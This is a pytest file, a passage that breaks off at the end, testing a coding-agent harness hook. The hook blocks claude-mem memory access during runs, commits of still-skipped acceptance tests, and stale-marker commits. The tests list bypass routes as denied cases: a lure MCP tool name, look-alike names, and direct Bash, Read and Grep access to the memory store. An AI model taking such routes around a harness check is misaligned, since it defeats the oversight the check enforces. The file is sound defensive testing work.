        mutant, _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )
    assert code == 2, "the multi-commit assertion must red on a recomputed SHA"
    assert "Marker-freshness guard" in _reason(out)


def test_mutant_freshness_scoped_to_checklist_allows_light_stale_marker(
    tmp_path: Path,
) -> None:
    """Twin: scope the clause to the production profile the way the sibling
    un-skip clause is scoped. Under the lighter profile no checklist exists, the
    clause stops firing, and the stale marker is allowed — so the
    profile-independence assertion reds. This is the realistic regression: the
    profile-scoped sibling lives in the same commit block."""
    mutant = _write_mutant(
        tmp_path,
        "freshness_scoped",
        _FRESHNESS_CALL_SITE,
        '        if (impl / f"atdd-checklist-{story}.md").is_file():\n'
        "            _marker_freshness_gate(marker, baseline)",
    )
    repo, impl = _green_story_repo(tmp_path, stage=True, marker_sha=_STALE_SHA)
    assert not (impl / "atdd-checklist-STORY-1.md").exists()

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )
    assert code == 0, "the profile-independence assertion must red once scoped"
    assert out is None

    # Control: with a checklist on disk the scoped clause fires again, so the
    # mutation really is a scoping change and not a wholesale deletion.
    (impl / "atdd-checklist-STORY-1.md").write_text("# checklist\n")
    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )
    assert code == 2
    assert "Marker-freshness guard" in _reason(out)


def test_non_git_bash_is_allowed(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    _init_repo(repo, "main")
    event = {
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": "npm test"},
        "cwd": str(repo),
    }

    code, out = _run_hook(event, repo)

    assert code == 0
    assert out is None


def test_non_bash_tool_is_allowed(tmp_path: Path) -> None:
    event = {
        "hook_event_name": "PreToolUse",
        "tool_name": "Edit",
        "tool_input": {"file_path": "x", "old_string": "a", "new_string": "b"},
        "cwd": str(tmp_path),
    }
    code, out = _run_hook(event, tmp_path)
    assert code == 0
    assert out is None


# ---------------------------------------------------------------------------
# Cross-Session Recall gate — the claude-mem latch path.
#
# The gate is armed by a .mem-state.json latch under impl-artifacts; tests point
# ULTRACODE_IMPL_ARTIFACTS at tmp_path so the latch (and its absence) is fully
# controlled per-test. _GREEN_STATE is a v1 latch that was green by the old
# rules (present + schema_ok True + recall on). Since latch v2 no latch state
# permits claude-mem: it denies like every other present latch. The v2
# store-path rule has its own section at the end of this file.
# ---------------------------------------------------------------------------

_GREEN_STATE = {
    "latch_version": 1,
    "run_id": "RUN-7",
    "claude_mem": "present",
    "schema_ok": True,
    "recall": "on",
    "tool_form": "plugin",
    "fingerprint": "abc123def4567890",
    "created_at": "2026-06-04T00:00:00Z",
}

# Live plugin-install MCP tool names (captured this session) + the lure that
# tries to smuggle a non-claude-mem op past a sloppy prefix check + a server
# key with a `_` in it, which Claude Code also writes for any character
# outside letters, digits, `_` and `-` (so `mem.search` gives `mem_search`).
_MEM_PLUGIN_TOOLS = (
    "mcp__plugin_claude-mem_mcp-search__search",
    "mcp__plugin_claude-mem_mcp-search__save_observation",
    "mcp__plugin_claude-mem_mcp-search____IMPORTANT",
    "mcp__plugin_claude-mem_mem_search__search",
)
# Bare-server install forms (dash and underscore server segments).
_MEM_BARE_TOOLS = (
    "mcp__claude-mem__search",
    "mcp__claude_mem__search",
)
# Look-alikes that MUST NOT be treated as claude-mem (memoir != mem; memory !=
# the bare server segment; an unrelated server entirely).
_NON_MEM_TOOLS = (
    "mcp__plugin_claude-memoir_x__y",
    "mcp__plugin_claude-memoir_mem_search__y",
    "mcp__claude-memory__z",
    "mcp__Neon__run_sql",
)


def _write_state(impl: Path, state) -> None:
    impl.mkdir(parents=True, exist_ok=True)
    if isinstance(state, (dict, list)):
        (impl / ".mem-state.json").write_text(json.dumps(state))
    else:
        (impl / ".mem-state.json").write_text(state)  # raw bytes-as-str payloads


def _mem_event(tool_name: str, cwd: Path, tool_input: dict | None = None) -> dict:
    return {
        "hook_event_name": "PreToolUse",
        "tool_name": tool_name,
        "tool_input": tool_input if tool_input is not None else {},
        "cwd": str(cwd),
    }


def _assert_mem_denied(code: int, out: dict | None) -> None:
    assert code == 2
    assert out is not None
    decision = out["hookSpecificOutput"]
    assert decision["permissionDecision"] == "deny"
    assert "Cross-Session Recall guard" in decision["permissionDecisionReason"]


# --- risk: an absent latch (no active run) must never touch claude-mem -------

def test_risk_no_latch_allows_claude_mem_and_git_guards_intact(tmp_path: Path) -> None:
    # No .mem-state.json at all: the user is outside any UCG run. A claude-mem
    # MCP call sails through, AND the existing git guard still fires.
    repo = tmp_path / "repo"
    repo.mkdir()
    _init_repo(repo, "main")
    impl = tmp_path / "impl"  # deliberately no state file written

    code, out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", repo),
        repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    assert code == 0
    assert out is None

    # Same absent-latch world: protected-branch git guard unchanged.
    gcode, gout = _run_hook(
        _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )
    assert gcode == 2
    assert "Protected-branch" in gout["hookSpecificOutput"]["permissionDecisionReason"]


# --- risk: no latch state permits claude-mem any more ------------------------
# Was test_risk_green_latch_allows_claude_mem_call. latch-and-guard.md, Guard
# item 1: "There is no green path", and it names this test among those that
# "Become denies".

def test_risk_green_latch_denies_claude_mem_call(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, _GREEN_STATE)  # green by the old v1 rules
    code, out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(code, out)


# --- risk: every not-green latch shape must fail closed (deny) ---------------

def test_risk_recall_off_denies(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "recall": "off"})
    code, out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(code, out)


def test_risk_claude_mem_absent_denies(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "claude_mem": "absent"})
    code, out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(code, out)


def test_risk_schema_ok_false_denies(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "schema_ok": False})
    code, out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(code, out)


def test_risk_zero_byte_state_denies(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, "")  # zero-byte latch -> fail closed
    code, out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(code, out)


def test_risk_malformed_json_state_denies(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, "{not: valid json,,,")  # unparseable -> fail closed
    code, out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(code, out)


def test_risk_type_mismatch_state_denies(tmp_path: Path) -> None:
    # schema_ok as the *string* "true" and recall as the *number* 1 must NOT
    # satisfy the strict-bool / strict-str predicates.
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "schema_ok": "true", "recall": 1})
    code, out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(code, out)


def test_risk_future_latch_version_denies(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "latch_version": 99})
    code, out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(code, out)


# --- risk: the matcher must hit every live claude-mem form, including the lure

@pytest.mark.parametrize("tool_name", _MEM_PLUGIN_TOOLS + _MEM_BARE_TOOLS)
def test_risk_matcher_hits_live_claude_mem_names(tmp_path: Path, tool_name: str) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "recall": "off"})  # not green -> must deny
    code, out = _run_hook(
        _mem_event(tool_name, tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(code, out)


# --- risk: the matcher must NOT over-reach onto look-alike tool names ---------

@pytest.mark.parametrize("tool_name", _NON_MEM_TOOLS)
def test_risk_matcher_ignores_lookalike_names(tmp_path: Path, tool_name: str) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "recall": "off"})  # not green
    code, out = _run_hook(
        _mem_event(tool_name, tmp_path, {"query": "x"}),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    # Not a claude-mem tool and not a filesystem reach-around -> allowed through.
    assert code == 0
    assert out is None


# --- risk: empty / missing tool_name is not a match -> allowed ---------------

def test_risk_empty_tool_name_allowed(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "recall": "off"})  # not green
    code, out = _run_hook(_mem_event("", tmp_path), tmp_path,
                          {"ULTRACODE_IMPL_ARTIFACTS": str(impl)})
    assert code == 0
    assert out is None


def test_risk_missing_tool_name_allowed(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "recall": "off"})  # not green
    event = {"hook_event_name": "PreToolUse", "tool_input": {}, "cwd": str(tmp_path)}
    code, out = _run_hook(event, tmp_path, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)})
    assert code == 0
    assert out is None


# --- risk: filesystem reach-arounds into the claude-mem store ----------------

def test_risk_not_green_denies_bash_touching_claude_mem(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "recall": "off"})  # not green
    event = _mem_event(
        "Bash", tmp_path, {"command": "sqlite3 ~/.claude-mem/store.db '.tables'"}
    )
    code, out = _run_hook(event, tmp_path, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)})
    _assert_mem_denied(code, out)


def test_risk_not_green_denies_read_of_claude_mem_path(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "recall": "off"})  # not green
    event = _mem_event(
        "Read", tmp_path, {"file_path": "/home/u/.claude-mem/x.json"}
    )
    code, out = _run_hook(event, tmp_path, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)})
    _assert_mem_denied(code, out)


def test_risk_not_green_denies_grep_under_claude_mem_path(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "recall": "off"})  # not green
    event = _mem_event(
        "Grep", tmp_path, {"pattern": "secret", "path": "/home/u/.claude-mem"}
    )
    code, out = _run_hook(event, tmp_path, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)})
    _assert_mem_denied(code, out)


# Was test_risk_green_latch_allows_filesystem_claude_mem_access, inverted by the
# same Guard item 1 line ("Become denies").
def test_risk_green_latch_denies_filesystem_claude_mem_access(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, _GREEN_STATE)  # green by the old v1 rules: still denied
    for event in (
        _mem_event("Bash", tmp_path, {"command": "ls ~/.claude-mem"}),
        _mem_event("Read", tmp_path, {"file_path": "/home/u/.claude-mem/x.json"}),
        _mem_event("Grep", tmp_path, {"pattern": "x", "path": "/home/u/.claude-mem"}),
    ):
        code, out = _run_hook(event, tmp_path, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)})
        _assert_mem_denied(code, out)


def test_risk_no_latch_allows_filesystem_claude_mem_access(tmp_path: Path) -> None:
    impl = tmp_path / "impl"  # no state file -> not an active run
    for event in (
        _mem_event("Bash", tmp_path, {"command": "ls ~/.claude-mem"}),
        _mem_event("Read", tmp_path, {"file_path": "/home/u/.claude-mem/x.json"}),
        _mem_event("Grep", tmp_path, {"pattern": "x", "path": "/home/u/.claude-mem"}),
    ):
        code, out = _run_hook(event, tmp_path, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)})
        assert code == 0, event["tool_name"]
        assert out is None, event["tool_name"]


# --- risk: deleting the latch mid-run reverts to absent semantics (allow) -----

def test_risk_latch_deleted_between_calls_behaves_as_absent(tmp_path: Path) -> None:
    impl = tmp_path / "impl"
    _write_state(impl, {**_GREEN_STATE, "recall": "off"})  # not green: would deny

    first_code, first_out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_mem_denied(first_code, first_out)

    # Stage 6 Finalize removes the latch (no caching across calls): now allow.
    (impl / ".mem-state.json").unlink()
    second_code, second_out = _run_hook(
        _mem_event("mcp__plugin_claude-mem_mcp-search__search", tmp_path),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    assert second_code == 0
    assert second_out is None

# --- risk: unknowable run state must fail closed for claude-mem calls --------

def test_risk_unresolvable_impl_artifacts_fails_closed_for_claude_mem(tmp_path: Path) -> None:
    # Event carries NO cwd and ULTRACODE_IMPL_ARTIFACTS is unset (empty): the
    # latch location is unknowable — not provably absent. A claude-mem call
    # must DENY (uncertain implies deny), while a non-claude-mem tool passes
    # through untouched. Regression for the review fail-open finding.
    event = {
        "hook_event_name": "PreToolUse",
        "tool_name": "mcp__plugin_claude-mem_mcp-search__save_observation",
        "tool_input": {},
    }
    code, out = _run_hook(event, tmp_path, {"ULTRACODE_IMPL_ARTIFACTS": ""})
    _assert_mem_denied(code, out)

    benign = {
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": "ls"},
    }
    bcode, bout = _run_hook(benign, tmp_path, {"ULTRACODE_IMPL_ARTIFACTS": ""})
    assert bcode == 0
    assert bout is None


# ---------------------------------------------------------------------------
# Un-skip proof: the staged CONTENT of the story's acceptance tests.
#
# In production the story's atdd-checklist names the acceptance-test files; the
# guard reads each one's staged post-image (`git show :<path>`) and refuses a
# commit while any still carries the skip marker. These tests drive the real
# thing: a temp repo with real staged blobs and a real checklist on disk.
#
# Two obligations run through the whole section:
#   - always stage something real, so the empty-index clause cannot deny first
#     and make every assertion below pass against the wrong deny; and
#   - assert on the deny MESSAGE, not merely on the exit code.
# ---------------------------------------------------------------------------

_ACCEPTANCE_REL = "tests/acceptance/login.spec.ts"
_CHECKLIST_NAME = "atdd-checklist-STORY-1.md"

# The clean blob deliberately carries the bare word "skip" in a position that is
# NOT a skip marker (the describe name). That property is what makes a guard
# widened to match the bare substring visibly over-fire; the allow-path test
# asserts the property on its own fixture so a later tidy-up cannot quietly
# remove it and turn the corresponding mutant into a no-op.
_CLEAN_ACCEPTANCE = (
    'describe("skip-free acceptance path", () => {\n'
    '  test("logs the user in", async () => {\n'
    "    expect(await login()).toBe(true);\n"
    "  });\n"
    "});\n"
)
_SKIPPED_ACCEPTANCE = (
    'describe("acceptance path", () => {\n'
    '  test.skip("logs the user in", async () => {\n'
    "    expect(await login()).toBe(true);\n"
    "  });\n"
    "});\n"
)


def _checklist_body(*rels: str) -> str:
    """A checklist in the shape the test-design stage writes: prose plus the
    acceptance-test paths it maps each criterion onto."""
    lines = ["# Acceptance checklist for STORY-1", ""]
    for index, rel in enumerate(rels, start=1):
        lines.append(f"- criterion {index} -> `{rel}` (red-phase, must be green)")
    return "\n".join(lines) + "\n"


def _production_repo(
    tmp_path: Path,
    *,
    staged: dict[str, str] | None = None,
    committed: dict[str, str] | None = None,
    checklist: str | None = None,
    artifacts_dirname: str = "test-artifacts",
) -> tuple[Path, Path, Path]:
    """A green-story repo plus a TEA test-artifacts root holding the checklist.

    `committed` lands in HEAD first (so a re-add can be modelled), `staged` is
    written and staged afterwards by an explicit `git add <path>`, the way the
    guard requires staging to happen: in its own prior step.
    """
    repo, impl = _green_story_repo(tmp_path, stage=False)
    tests_root = repo / artifacts_dirname
    tests_root.mkdir(parents=True, exist_ok=True)
    if checklist is not None:
        (tests_root / _CHECKLIST_NAME).write_text(checklist)
    for rel, body in (committed or {}).items():
        target = repo / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(body)
        _git(repo, "add", rel)
    if committed:
        _git(repo, "commit", "-q", "-m", "prior story work")
    for rel, body in (staged or {}).items():
        target = repo / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(body)
        _git(repo, "add", rel)
    return repo, impl, tests_root


def _production_env(impl: Path, tests_root: Path) -> dict:
    return {
        "ULTRACODE_IMPL_ARTIFACTS": str(impl),
        "ULTRACODE_TEST_ARTIFACTS": str(tests_root),
    }


def test_unskip_clean_staged_acceptance_test_allowed(tmp_path: Path) -> None:
    # Fixture property this test's mutant depends on, asserted rather than
    # assumed: the clean blob carries the bare word "skip" outside any marker.
    assert "skip" in _CLEAN_ACCEPTANCE, "fixture must contain the bare substring"
    assert "test.skip(" not in _CLEAN_ACCEPTANCE, "...but no real skip marker"

    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 0, "un-skipped acceptance tests: the commit is a green boundary"
    assert out is None


def test_unskip_staged_skip_marker_denied_on_first_commit(tmp_path: Path) -> None:
    # First commit for this file: it is a freshly added, all-plus blob with no
    # prior version anywhere in history, so nothing could be diffed against.
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _SKIPPED_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 2
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "Un-skip proof" in _reason(out)


def test_unskip_deny_message_names_clause_files_and_recovery(tmp_path: Path) -> None:
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _SKIPPED_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )

    _, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    reason = _reason(out)
    assert "Un-skip proof" in reason  # names the failing clause...
    assert "Empty-index guard" not in reason  # ...and is not the sibling clause
    assert _ACCEPTANCE_REL in reason  # the offending file
    assert "test.skip(" in reason  # what was found in it
    assert "Un-skip every acceptance test" in reason  # the recovery
    assert "restage" in reason and "SEPARATE tool call" in reason


def test_unskip_inert_without_atdd_checklist(tmp_path: Path) -> None:
    # In scope (the test-artifacts root resolves to a real directory) but the
    # story has no checklist: the lighter profile, where acceptance tests are
    # never generated. This exercises the checklist-missing branch itself.
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={"story.txt": "story work"},
        checklist=None,
    )
    assert tests_root.is_dir()
    assert not (tests_root / _CHECKLIST_NAME).exists()

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 0
    assert out is None


def test_unskip_readded_skip_marker_denied(tmp_path: Path) -> None:
    # The marker was absent in HEAD and is back in the staged blob. A diff-wise
    # reading ("was a pre-existing marker removed?") waves this through; reading
    # the staged content does not.
    repo, impl, tests_root = _production_repo(
        tmp_path,
        committed={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        staged={_ACCEPTANCE_REL: _SKIPPED_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 2
    assert "Un-skip proof" in _reason(out)
    assert _ACCEPTANCE_REL in _reason(out)


def test_unskip_absent_marker_control_allowed(tmp_path: Path) -> None:
    # Same history shape as the re-add above, minus the marker in the staged
    # blob: the commit is allowed. The pair is what shows the clause keys on
    # content presence rather than on the direction of the change.
    repo, impl, tests_root = _production_repo(
        tmp_path,
        committed={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        staged={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE + "// one more assertion\n"},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 0
    assert out is None


def test_unskip_guard_docstring_notes_js_vitest_only_token(tmp_path: Path) -> None:
    src = _hook_source()
    doc = src[src.index('"""'):src.index('"""', src.index('"""') + 3)]

    def _states_the_caveat(text: str) -> bool:
        return "test.skip(" in text and re.search(
            r"JS/Vitest-specific|JS/Vitest specific", text
        ) is not None

    assert _states_the_caveat(doc), "the guard docstring must scope the token"
    assert "pytest" in doc and "Go" in doc, "and name a stack it does not cover"

    # Anti-vacuous: strip the caveat sentence and the same predicate fails, so
    # the assertion is not satisfied by prose that predates this check.
    caveat_start = doc.index("  Skip token matched:")
    stripped = doc[:caveat_start]
    assert not _states_the_caveat(stripped)


def _env_unset_repo(tmp_path: Path) -> tuple[Path, Path, Path]:
    """A repo whose checklist and skip-carrying staged test sit at exactly the
    path a cwd-derived test-artifacts fallback would resolve to.

    Load-bearing: without the planted checklist, a resolver that invented that
    fallback would find nothing, go inert for want of a checklist, and the
    unset-env test would stay green while the defect shipped.
    """
    return _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _SKIPPED_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
        artifacts_dirname="_bmad-output/test-artifacts",
    )


def test_unskip_inert_when_test_artifacts_env_unset(tmp_path: Path) -> None:
    repo, impl, tests_root = _env_unset_repo(tmp_path)
    # The fixture properties the corresponding mutant needs, asserted here:
    assert tests_root == repo / "_bmad-output" / "test-artifacts"
    assert (tests_root / _CHECKLIST_NAME).is_file()
    assert "test.skip(" in (repo / _ACCEPTANCE_REL).read_text()

    # Hooks armed by a run that predates this check inject no test-artifacts
    # root. Out of scope must mean no decision at all, never a deny.
    code, out = _run_hook(
        _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )

    assert code == 0
    assert out is None


def test_unskip_inert_note_goes_to_stderr_not_stdout(tmp_path: Path) -> None:
    repo, impl, _ = _env_unset_repo(tmp_path)

    proc = _hook_proc(
        HOOK, _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )

    assert proc.returncode == 0
    assert proc.stdout.strip() == "", "stdout is the decision channel and stays clean"
    assert "ULTRACODE_TEST_ARTIFACTS is unset" in proc.stderr
    assert proc.stderr.count("Un-skip proof") == 1, "one note per invocation"


def _function_source(src: str, name: str) -> str:
    start = src.index(f"def {name}(")
    return src[start:src.index("\ndef ", start + 1)]


def _code_only(fn_src: str) -> str:
    """The function's code with its docstring and comment lines removed."""
    kept, in_doc = [], False
    for line in fn_src.splitlines():
        stripped = line.strip()
        if in_doc:
            if stripped.endswith('"""'):
                in_doc = False
            continue
        if stripped.startswith('"""'):
            if not (len(stripped) > 3 and stripped.endswith('"""')):
                in_doc = True
            continue
        if stripped.startswith("#"):
            continue
        kept.append(line)
    return "\n".join(kept)


def _resolver_derives_a_path(hook_src: str) -> bool:
    """True when the test-artifacts resolver invents a path from cwd instead of
    returning None when the env var is unset."""
    return "cwd" in _code_only(_function_source(hook_src, "_test_artifacts"))


def test_unskip_test_artifacts_resolver_has_no_cwd_fallback() -> None:
    src = _hook_source()
    resolver = _function_source(src, "_test_artifacts")
    assert "ULTRACODE_TEST_ARTIFACTS" in resolver
    # No cwd is even in scope: unset must resolve to None, out of scope.
    assert resolver.splitlines()[0] == "def _test_artifacts() -> Path | None:"
    assert not _resolver_derives_a_path(src)
    assert "return None" in _code_only(resolver)
    # Anti-vacuous: the sibling resolver DOES carry the fallback shape this one
    # must not, so the check is discriminating rather than trivially true.
    assert "cwd" in _code_only(_function_source(src, "_impl_artifacts"))


def test_unskip_unreadable_checklist_denies(tmp_path: Path) -> None:
    # The staged blob is CLEAN: absent the read failure this commit is allowed,
    # so the deny can only come from the unreadable checklist.
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )
    checklist = tests_root / _CHECKLIST_NAME
    checklist.write_bytes(b"\xff\xfe not decodable \x00\x9c")

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 2
    reason = _reason(out)
    assert "Un-skip proof" in reason and "could not be read" in reason
    assert "Empty-index guard" not in reason

    # Second unreadable shape, exercised only where file modes actually bite
    # (a root runner ignores them, and a conditional beats a silent skip).
    checklist.write_text(_checklist_body(_ACCEPTANCE_REL))
    checklist.chmod(0o000)
    if not os.access(checklist, os.R_OK):
        code, out = _run_hook(
            _commit_event(repo), repo, _production_env(impl, tests_root)
        )
        assert code == 2
        assert "could not be read" in _reason(out)
    checklist.chmod(0o644)


def test_unskip_git_show_failure_denies_naming_failure(tmp_path: Path) -> None:
    # The checklist names a file that is not in the index at all, so the staged
    # read cannot answer. Something else IS staged, so the empty-index clause
    # passes and this deny is unambiguously the staged-read failure.
    missing = "tests/acceptance/missing.spec.ts"
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={"story.txt": "story work"},
        checklist=_checklist_body(missing),
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 2
    reason = _reason(out)
    assert "Un-skip proof" in reason
    assert "git show :" in reason and missing in reason  # names the failure
    assert "Empty-index guard" not in reason


def test_unskip_checklist_with_no_test_files_is_inert(tmp_path: Path) -> None:
    # A real production story that ships no acceptance-test file (documentation,
    # a refactor): its checklist enumerates nothing, and that is not a fault.
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={"docs/notes.md": "prose only\n"},
        checklist="# Acceptance checklist for STORY-1\n\nNo acceptance tests: docs only.\n",
    )

    code, out = _run_hook(_commit_event(repo), repo, _production_env(impl, tests_root))

    assert code == 0, "a doc-only story must not be blocked by the un-skip proof"
    assert out is None


# --- Executed mutants of the un-skip clause ---------------------------------
# One mutation per branch, each on a COPY of the hook under tmp_path, each
# proving the branch it neuters is the thing producing the behavior above.

_UNSKIP_TOKEN_TEST = "        if _SKIP_TOKEN in blob:"
_UNSKIP_DENY = "    if still_skipped:\n        _deny(\n"
_UNSKIP_NO_CHECKLIST = (
    "    if not checklist.is_file():\n"
    "        return  # no acceptance tests for this story: nothing to prove"
)
_UNSKIP_NO_FILES = (
    "    if not files:\n"
    "        return  # checklist names no acceptance-test file (doc-only story)"
)
_UNSKIP_UNREADABLE = "    except (OSError, UnicodeDecodeError):\n        _deny(\n"
_UNSKIP_UNREADABLE_STAGED = "        if not readable:\n            _deny(\n"
_TEST_ARTIFACTS_DEF = "def _test_artifacts() -> Path | None:"
_TEST_ARTIFACTS_TAIL = (
    '    env = os.environ.get("ULTRACODE_TEST_ARTIFACTS")\n'
    "    if env:\n"
    "        return Path(env)\n"
    "    return None"
)
_TEST_ARTIFACTS_CALL = "    tests_root = _test_artifacts()"


def _write_mutant_multi(tmp_path: Path, name: str, edits: list[tuple[str, str]]) -> Path:
    """Copy the shipped hook, apply several textual edits that together make ONE
    behavioral change, return the copy."""
    src = _hook_source()
    for old, new in edits:
        assert old in src, f"mutation anchor drifted out of the hook: {name}"
        src = src.replace(old, new, 1)
    path = tmp_path / f"mutant_{name}.py"
    path.write_text(src, encoding="utf-8")
    return path


def test_mutant_bare_skip_substring_reds_clean_acceptance_commit(tmp_path: Path) -> None:
    """Twin: widen the match from the `test.skip(` token to the bare substring
    `skip`. The clean blob then denies, so the allow-path assertion reds — which
    is what proves that assertion pins the token rather than passing because the
    clause never ran."""
    mutant = _write_mutant(
        tmp_path, "bare_skip", _UNSKIP_TOKEN_TEST, '        if "skip" in blob:'
    )
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, _production_env(impl, tests_root)
    )

    assert code == 2, "the allow-path assertion must red when the match widens"
    assert "Un-skip proof" in _reason(out)


def test_mutant_unskip_note_instead_of_deny_allows_skipped_commit(tmp_path: Path) -> None:
    """Twin: swap the deny for the out-of-scope note-and-return path. The
    freshly added, still-skipped blob is then allowed and both deny assertions
    red."""
    mutant = _write_mutant(
        tmp_path,
        "unskip_note",
        _UNSKIP_DENY,
        '    if still_skipped:\n        _note("mutant: note instead of deny")\n'
        "        return\n        _deny(\n",
    )
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _SKIPPED_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, _production_env(impl, tests_root)
    )

    assert code == 0, "both staged-marker deny assertions must red"
    assert out is None


def test_mutant_missing_checklist_denies_reds_light_profile_commit(tmp_path: Path) -> None:
